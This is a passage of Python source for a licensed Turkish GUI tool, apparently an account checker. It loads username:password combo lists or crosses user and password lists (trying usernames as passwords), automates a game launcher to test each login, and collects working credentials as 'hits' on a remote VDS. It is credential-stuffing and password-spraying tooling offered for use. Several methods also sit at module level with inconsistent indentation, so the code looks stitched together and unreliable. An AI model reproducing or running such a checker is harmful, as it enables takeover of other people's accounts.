                    if self._launcher:
                        self._launcher.reset_uia()
                except Exception:
                    pass

                try:
                    if self._launcher:
                        hwnd = self._launcher.find_hwnd()
                        if hwnd:
                            self._launcher.dismiss_error_dialog(hwnd)
                except Exception:
                    pass

                if self._watchdog_fails >= 2:
                    self.msg_queue.put(("log", "🔄 WATCHDOG: Launcher zorla yeniden başlatılıyor..."))
                    try:
                        if self._launcher:
                            self._launcher.kill_launcher()
                            time.sleep(0.5)
                            self._launcher.start_launcher()
                    except Exception:
                        pass
                    self._watchdog_fails = 0

                self._last_activity = time.monotonic()

    @staticmethod
    def _read_accounts(mode, path_acc, path_user, path_pass):
        accounts = []
        try:
            if mode == "single":
                if not os.path.isfile(path_acc): return []
                with open(path_acc, "r", encoding="utf-8") as f:
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith(";") or line.startswith("#"): continue
                        if line.lower() == "username:password": continue
                        if ":" not in line: continue
                        user, pwd = line.split(":", 1)
                        user, pwd = user.strip(), pwd.strip()
                        if user and pwd:
                            accounts.append((user, pwd))
            else:
                users = []
                if os.path.isfile(path_user):
                    with open(path_user, "r", encoding="utf-8") as f:
                        for line in f:
                            line = line.strip()
                            if line and not line.startswith(";") and not line.startswith("#"):
                                users.append(line)
                passes = []
                if path_pass and os.path.isfile(path_pass):
                    with open(path_pass, "r", encoding="utf-8") as f:
                        for line in f:
                            line = line.strip()
                            if line and not line.startswith(";") and not line.startswith("#"):
                                passes.append(line)

                if not passes:
                    for u in users:
                        accounts.append((u, u))
                else:
                    for u in users:
                        for p in passes:
                            accounts.append((u, p))
        except Exception:
            pass
        return accounts

    # ══════════════════════════════════════════════════
    # UI HANDLER METOTLARI
    # ══════════════════════════════════════════════════
    def _poll(self):
        try:
            for _ in range(80):
                msg = self.msg_queue.get_nowait()
                self._handle(msg)
        except queue.Empty:
            pass
        self.after(30, self._poll)

    def _handle(self, msg):
        kind = msg[0]
        if kind == "log":
            self._log(msg[1])
        elif kind == "stats":
            self._refresh_stats()
        elif kind == "progress":
            self._set_progress(msg[1], msg[2])
        elif kind == "hit":
            self._add_hit(msg[1], msg[2])
        elif kind == "done":
            self._on_done()

    def _log(self, text):
        ts = datetime.now().strftime("%H:%M:%S")
        self.log_box.configure(state="normal")
        self.log_box.insert("end", f"[{ts}]  {text}\n")
        lines = int(self.log_box.index("end-1c").split(".")[0])
        if lines > 200:
            self.log_box.delete("1.0", f"{lines - 200}.0")
        self.log_box.see("end")
        self.log_box.configure(state="disabled")

    def _refresh_stats(self):
        self.lbl_total.configure(text=str(self.n_total))
        self.lbl_ok.configure(text=str(self.n_ok))
        self.lbl_fail.configure(text=str(self.n_fail))

        if self._start_time and self.is_running:
            elapsed = time.monotonic() - self._start_time
            done = self.n_ok + self.n_fail
            if elapsed > 0 and done > 0:
                apm = done / (elapsed / 60)
                self.lbl_speed.configure(text=f"{apm:.0f}/dk")
            else:
                self.lbl_speed.configure(text="—")

    def _set_progress(self, current, total):
        if total > 0:
            frac = current / total
            pct  = int(100 * frac)
            self.pbar.set(frac)
            self.progress_text.configure(text=f"{current}/{total}  ({pct}%)")

    def _on_done(self):
        self.is_running = False
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")
        for w in self.picker_container.winfo_children():
            try:
                for child in w.winfo_children():
                    if isinstance(child, (ctk.CTkButton, ctk.CTkEntry)):
                        child.configure(state="normal")
            except Exception:
                pass
            if isinstance(w, (ctk.CTkButton, ctk.CTkEntry)):
                w.configure(state="normal")

        if self.stop_event.is_set():
            self.status_dot.configure(text="●  DURDURULDU", text_color=C.WARN)
        else:
            self.status_dot.configure(text="●  TAMAMLANDI", text_color=C.OK)


# ═══════════════════════════════════════════════════════════════════════════
# RDP OTURUM İZLEYİCİ — VDS'den çıkınca program durmaz
# ═══════════════════════════════════════════════════════════════════════════
def _setup_rdp_monitor(self):
    """RDP disconnect/reconnect olaylarını izler. Ayrı thread'de çalışır."""
    import threading
    threading.Thread(target=self._rdp_monitor_thread, daemon=True).start()

def _rdp_monitor_thread(self):
    """
    Win32 WTS API ile oturum durumunu 2sn'de bir kontrol eder.
    Disconnect → pencereyi küçült (program çalışmaya devam eder)
    Reconnect  → pencereyi geri getir
    """
    try:
        import ctypes, ctypes.wintypes, time

        wtsapi32  = ctypes.WinDLL("Wtsapi32.dll")
        kernel32  = ctypes.WinDLL("kernel32.dll")

        WTS_CURRENT_SERVER  = ctypes.c_void_p(0)
        WTSConnectState     = 8
        # Bağlantı durumu sabitleri
        WTSActive           = 0   # Aktif RDP oturumu
        WTSDisconnected     = 4   # Bağlantı kesildi (session hala var)

        current_pid = kernel32.GetCurrentProcessId()

        class WTS_SESSION_INFO(ctypes.Structure):
            _fields_ = [
                ("SessionId",    ctypes.c_ulong),
                ("pWinStationName", ctypes.c_wchar_p),
                ("State",        ctypes.c_int),
            ]

        prev_state = None
        _disconnected_shown = False

        while True:
            try:
                sessions_ptr  = ctypes.POINTER(WTS_SESSION_INFO)()
                session_count = ctypes.c_ulong(0)

                if wtsapi32.WTSEnumerateSessionsW(
                    WTS_CURRENT_SERVER, 0, 1,
                    ctypes.byref(sessions_ptr),
                    ctypes.byref(session_count)
                ):
                    # Kendi session ID'sini bul
                    own_session = None
                    try:
                        import win32process, win32api
                        own_session = win32ts_get_session()
                    except Exception:
                        try:
                            # Fallback: ProcessIdToSessionId
                            _sid = ctypes.c_ulong(0)
                            if kernel32.ProcessIdToSessionId(current_pid, ctypes.byref(_sid)):
                                own_session = _sid.value
                        except Exception:
                            pass

                    state = None
                    if own_session is not None:
                        for i in range(session_count.value):
                            s = sessions_ptr[i]
                            if s.SessionId == own_session:
                                state = s.State
                                break

                    wtsapi32.WTSFreeMemory(sessions_ptr)

                    if state is not None and state != prev_state:
                        if state == WTSDisconnected and not _disconnected_shown:
                            # VDS bağlantısı kesildi → minimize et
                            _disconnected_shown = True
                            self.after(0, self._on_rdp_disconnect)
                        elif state == WTSActive and prev_state == WTSDisconnected:
                            # VDS'e tekrar bağlandı → pencereyi geri getir
                            _disconnected_shown = False
                            self.after(0, self._on_rdp_reconnect)
                        prev_state = state

            except Exception:
                pass

            time.sleep(2)

    except Exception:
        pass  # RDP izleme başarısız olsa da program çalışmaya devam eder

def win32ts_get_session():
    """Mevcut process'in session ID'sini döndür."""
    import ctypes
    kernel32 = ctypes.WinDLL("kernel32.dll")
    pid = kernel32.GetCurrentProcessId()
    sid = ctypes.c_ulong(0)
    kernel32.ProcessIdToSessionId(pid, ctypes.byref(sid))
    return sid.value

def _on_rdp_disconnect(self):
    """VDS bağlantısı kesilince çağrılır — pencereyi minimize et."""
    try:
        import win32gui, win32con
        hwnd = self.winfo_id()
        win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)
    except Exception:
        try:
            self.iconify()
        except Exception:
            pass
    # Log
    if hasattr(self, 'msg_queue'):
        self.msg_queue.put(("log", "🔌 VDS bağlantısı kesildi — program arka planda çalışmaya devam ediyor"))

def _on_rdp_reconnect(self):
    """VDS'e yeniden bağlanınca çağrılır — pencereyi geri getir."""
    try:
        import win32gui, win32con
        hwnd = self.winfo_id()
        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
        win32gui.SetForegroundWindow(hwnd)
    except Exception:
        pass
    try:
        self.deiconify()
        self.lift()
    except Exception:
        pass
    if hasattr(self, 'msg_queue'):
        self.msg_queue.put(("log", "✅ VDS bağlantısı yeniden kuruldu — pencere geri getirildi"))

    def _on_close(self):
        if self.is_running:
            self.stop_event.set()
            self.after(800, self.destroy)
        else:
            self.destroy()

    def _browse(self, target="accounts"):
        init = BASE_DIR
        path = filedialog.askopenfilename(
            title="Dosya Seç",
            filetypes=[("Text Dosyaları", "*.txt"), ("Tüm Dosyalar", "*.*")],
            initialdir=init
        )
        if path:
            if target == "accounts":
                self.accounts_path.set(path)
            elif target == "users":
                self.usernames_path.set(path)
            elif target == "passes":
                self.passwords_path.set(path)

            self.last_index = 0
            self._save_state(0)
            n = len(self._read_accounts_full())
            self._log(f"Yüklendi: Toplam {n} hesap.")

    def _read_accounts_full(self):
        return self._read_accounts(
            self.combo_mode.get(),
            self.accounts_path.get(),
            self.usernames_path.get(),
            self.passwords_path.get()
        )

    def _vds_disconnect(self):
        try:
            import subprocess
            subprocess.Popen(["cmd", "/c", "start", "", "disconnect.bat"], shell=True)
            self._log("🔌 VDS bağlantısı kesiliyor...")
        except Exception as e:
            self._log(f"VDS çıkış hatası: {e}")
            messagebox.showerror("Hata", f"disconnect.bat çalıştırılamadı:\n{e}")

    def _on_mode_change(self, mode=None):
        self._build_combo_picker()

    def _start(self):
        accounts = self._read_accounts_full()
        if not accounts:
            messagebox.showwarning("Uyarı", "Geçerli bir hesap bulunamadı!")
            return
        if not self._launcher:
            messagebox.showerror("Hata", "launcher.py yüklenemedi!")
            return

        self.is_running = True
        self.stop_event.clear()
        self._start_time = time.monotonic()

        if self.last_index == 0:
            self.n_ok = 0
            self.n_fail = 0
            self.n_total = 0
            self.pbar.set(0)
            self.progress_text.configure(text="Başlatılıyor...")
            self.hit_list.clear()
            for w in self.hit_scroll.winfo_children():
                w.destroy()
            self.hit_count_lbl.configure(text="0")

        self._refresh_stats()

        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")
        # Dosya seçicileri kilitle
        for w in self.picker_container.winfo_children():
            try:
                for child in w.winfo_children():
                    if isinstance(child, (ctk.CTkButton, ctk.CTkEntry)):
                        child.configure(state="disabled")
            except Exception:
                pass
            if isinstance(w, (ctk.CTkButton, ctk.CTkEntry)):
                w.configure(state="disabled")

        self.status_dot.configure(text="● ÇALIŞIYOR…", text_color=C.ACCENT)
        threading.Thread(target=self._worker, daemon=True).start()

    def _stop(self):
        self.stop_event.set()
        self.stop_btn.configure(state="disabled")
        self.status_dot.configure(text="● DURDURULUYOR…", text_color=C.WARN)

    def _add_hit(self, user, pwd):
        ts = datetime.now().strftime("%H:%M:%S")
        self.hit_list.append((user, pwd, ts))
        
        row = ctk.CTkFrame(self.hit_scroll, fg_color=C.CARD, corner_radius=6, 
                           border_width=1, border_color="#003322", height=32)
        row.pack(fill="x", pady=2, padx=2)
        row.pack_propagate(False)
        
        inner = ctk.CTkFrame(row, fg_color="transparent")
        inner.pack(fill="x", expand=True, padx=8)
        
        ctk.CTkLabel(inner, text="✓", text_color=C.OK, 
                     font=ctk.CTkFont(FN, 12, "bold")).pack(side="left")
        ctk.CTkLabel(inner, text=f" {user}:{pwd}", font=ctk.CTkFont(FM, 10), 
                     text_color=C.WHITE).pack(side="left", padx=(4, 0))
        ctk.CTkLabel(inner, text=ts, font=ctk.CTkFont(FM, 9), 
                     text_color=C.MUTED).pack(side="right")
        
        self.hit_count_lbl.configure(text=str(len(self.hit_list)))

    def _copy_hits(self):
        if not self.hit_list:
            return
        text = "\n".join([f"{u}:{p}" for u, p, _ in self.hit_list])
        self.clipboard_clear()
        self.clipboard_append(text)
        self.copy_btn.configure(text="✓ Kopyalandı")
        self.after(1500, lambda: self.copy_btn.configure(text="📋 Kopyala"))

if __name__ == "__main__":
    license_manager.verify_license()
    app = ForzaApp()
    app.mainloop()
